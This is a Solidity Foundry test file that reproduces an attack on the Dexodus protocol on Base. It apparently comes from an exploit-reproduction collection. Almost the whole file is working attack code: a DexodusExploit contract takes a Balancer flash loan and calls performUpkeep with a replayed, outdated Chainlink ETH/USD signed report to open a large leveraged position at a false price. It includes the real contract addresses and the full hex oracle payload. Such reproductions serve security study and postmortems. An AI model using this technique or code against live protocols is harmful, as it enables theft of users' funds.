// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IAutomationPositionsV2 {
    function performUpkeep(bytes calldata performData) external;
}

contract Dexodus is Test {
    DexodusExploit exploitContract;
    address exploiter = 0x863D3B920a6D98D5689D2cB8Bb0D61E90a91e0dc;
    address usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    constructor() {
        // Fork Base chain at block just before the exploit
        vm.createSelectFork("base", 30737030 - 1);

        exploitContract = new DexodusExploit();
    }

    function testExploit() public {
        vm.startPrank(exploiter);
        IERC20(usdc).approve(address(exploitContract), type(uint256).max);

        // Provide initial USDC balance to the exploit contract
        deal(usdc, address(exploitContract), 10_500_000_000);

        exploitContract.exploit();

        vm.stopPrank();
    }
}

contract DexodusExploit {
    IBalancerVault public balancerVault;
    IAutomationPositionsV2 public automationPositions;
    address usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address exploiter;
    constructor() payable {
        balancerVault = IBalancerVault(
            0xBA12222222228d8Ba445958a75a0704d566BF2C8
        );
        automationPositions = IAutomationPositionsV2(
            0xF6Aad394eD38D860bd2f3Cc142D7eB5BbBBBA169
        );
    }

    function exploit() public {
        exploiter = msg.sender;
        address[] memory tokens = new address[](1);
        tokens[0] = usdc;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_500_000_000;

        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        IERC20(tokens[0]).transfer(exploiter, amounts[0] + feeAmounts[0]);

        bytes[] memory signedReports = new bytes[](1);
        bytes memory extraData; // OrderData

        extraData = abi.encode(
            exploiter, // owner
            10_000_000_000, // collateral
            1_000_000_000_000, // size
            true, // isLong
            true, // isIncrease
            0xbaf2dfadf73bb5597dae55258a19b57d5117bbb6753b578ae11715c86cfda1ef, // marketKey
            1819044153, // price
            50 // slippage
        );

        // This data is chainlink price oracle report(data stream)
        // ETH/USD
        // This Report is past report when ETH is $1819
        signedReports[
            0
        ] = hex"00096cdfc09d2c952582fc68539499c5b496b5123c7359bc339d3d4cd7be8751000000000000000000000000000000000000000000000000000000000099b995000000000000000000000000000000000000000000000000000000040000000100000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000030001000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120000362205e10b3a147d02792eccee483dca6c7b44ecce7012cb8c6e0b68b3ae9000000000000000000000000000000000000000000000000000000006810de51000000000000000000000000000000000000000000000000000000006810de510000000000000000000000000000000000000000000000000000a0300897ccf1000000000000000000000000000000000000000000000000004c07d277b6fb0a0000000000000000000000000000000000000000000000000000000068386b510000000000000000000000000000000000000000000000627d95b263ee4d7c200000000000000000000000000000000000000000000000627c9e0084954de8000000000000000000000000000000000000000000000000627e24da2fc32100c0000000000000000000000000000000000000000000000000000000000000000672e1b4043ea61e699784cb59523a94e82bd0199c47b360204f594181c79ab5a60320fc01907baca5d0a4f75661281cc6123715dd036b7de1e198bfa45c8229481f63c81f5d2a4af04ac2c6ad890154df3494664ad5b85467c8409685280cdefc93ef739a9c5a08bb61ae26dd160e808b431e66b55e0d2c4098444006568482a78fb4fd43f3bb9b665e8e68820484c86611dafc7d1866b5c7d63ac9151356df51de8621fead42fd1be643405eb89cda1382b40132068da17633c750511157842500000000000000000000000000000000000000000000000000000000000000064aa7be84cccb0c0232937771fb62036e5c2dea1e513e29d625a382a8f1ce68eb69ee5daa8e6f7d1ff0fe02757187aff5fced8e281cf6189f0e208bc2fb270a2b0eea7d360c55d63e1ba9498eece2c5e5d3e15b0b6b786a373bc5ffcdb263986608458fc39b69c39d210182811aa085b6a86111f53966b8d69af77872a9a6e7e17a6244ab12d51b42fb26f560500b97920cf202a95a2aa1e0bf3e16a7e513c7104121ee463df774e4ed552f09ae7465ef748f561889fa967ad306a775baffcad0";

        bytes memory performData = abi.encode(signedReports, extraData);
        automationPositions.performUpkeep(performData);

        // Return funds to Balancer Vault
        IERC20(tokens[0]).transfer(
            address(balancerVault),
            amounts[0] + feeAmounts[0]
        );
    }
}
